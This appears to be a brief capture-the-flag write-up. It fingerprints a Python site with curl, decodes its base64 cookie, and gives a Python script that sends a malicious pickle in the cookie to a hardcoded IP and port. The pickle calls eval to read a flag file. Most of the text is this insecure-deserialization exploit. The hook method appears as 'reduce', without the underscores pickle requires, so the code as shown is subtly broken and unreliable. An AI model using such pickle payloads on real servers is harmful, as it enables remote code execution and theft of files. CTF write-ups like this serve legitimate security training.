let's see what server the website is running on with curl
curl -I "url"
we see that it runs on python so we get our set-cookie which we are going to decode
echo -n "..." | base64 -d
the cookies seem to be encrypted in base64 so we need to find a python code 

import pickle 
import base64
import requests
class Exploit (object):
        def reduce (self):
                return eval, ("open('flag', 'r').read()", )
def sendPayload(p):
        print (base64.urlsafe_b64encode(p))
        headers ={"Cookie": "data=" + base64.urlsafe_b64encode(p).decode()}
        t = requests.get("http://34.141.39.165:31924/dashboard", headers=headers) 
        print(t.text)
sendPayload(pickle.dumps(Exploit(), protocol=2))
